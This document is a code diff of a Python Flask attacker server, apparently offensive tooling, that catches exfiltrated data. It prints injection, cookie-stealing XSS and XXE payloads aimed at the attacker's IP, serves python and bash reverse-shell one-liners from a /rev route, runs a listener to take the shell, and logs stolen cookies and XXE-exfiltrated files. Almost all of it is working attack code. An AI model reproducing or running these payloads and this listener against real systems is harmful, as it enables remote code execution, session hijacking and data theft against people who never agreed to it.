@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 from flask import Flask,Response,request
-import sys,logging,argparse,socket,netifaces
+import sys,logging,argparse,socket,netifaces,threading,os,select
 log=logging.getLogger('werkzeug')
 log.disabled=True
 cli=sys.modules['flask.cli']
@@ -15,16 +15,48 @@ else:
  except:print('Interface not found');sys.exit(1)
 app=Flask(__name__)
 l={}
-print("""
+
+def banner():
+ print("""
 \033[38;5;208m** Exfil using routes! **\033[0m
-🐚: curl${IFS}http://%s/rev/443|bash
+🐚: $'\\x0a'curl${IFS}http://%s/rev/4444|bash
 🍪: <svg%%0Conload="\\u0064ocument.write('<img%%0Csrc=http://%s?c='%%2b\\u0064ocument.cookie%%2b'>')"/>
 🗂️: Content-Type: text/xml <?xml version="1.0"?><!DOCTYPE x SYSTEM "http://%s/dtd"><x>&e1;</x>
 """%(ip,ip,ip))
+
+def rev(p):
+ s=socket.socket()
+ s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+ s.bind(('0.0.0.0',p))
+ s.listen(1)
+ print(f'\033[92m[*] Listening for reverse shell on {p}\033[0m')
+ c,a=s.accept()
+ print(f'\033[92m[+] Connection from {a[0]}\033[0m')
+ c.setblocking(False)
+ while True:
+  r,_,_=select.select([c,sys.stdin],[],[])
+  if c in r:
+   try:
+    d=c.recv(4096)
+    if not d:break
+    sys.stdout.buffer.write(d)
+    sys.stdout.flush()
+   except:break
+  if sys.stdin in r:
+   d=sys.stdin.buffer.read1(4096)
+   if not d:break
+   try:c.send(d)
+   except:break
+ c.close()
+ print()
+ banner()
+
 @app.route('/rev/<int:p>')
 def r(p):
- payload=f'bash -i >& /dev/tcp/{ip}/{p} 0>&1'
+ threading.Thread(target=rev,args=(p,),daemon=True).start()
+ payload=f'''python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("{ip}",{p}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' 2>/dev/null || python -c 'import socket,os,pty;s=socket.socket();s.connect(("{ip}",{p}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' 2>/dev/null || bash -c "bash -i >& /dev/tcp/{ip}/{p} 0>&1"'''
  return Response(payload,mimetype='text/plain')
+
 @app.route('/dtd')
 def dtd():
  data=request.args.get('data')
@@ -43,6 +75,7 @@ def dtd():
  print('----------------------------------------------------')
  print()
  return'',204
+
 @app.route('/',methods=['GET','POST'])
 def h():
  d=request.args.get('c')or request.get_data(as_text=True)or''
@@ -58,5 +91,7 @@ def h():
   print('----------------------------------------------------')
   print()
  return'',204
+
 if __name__=="__main__":
+ banner()
  app.run(host='0.0.0.0',port=80,debug=False)
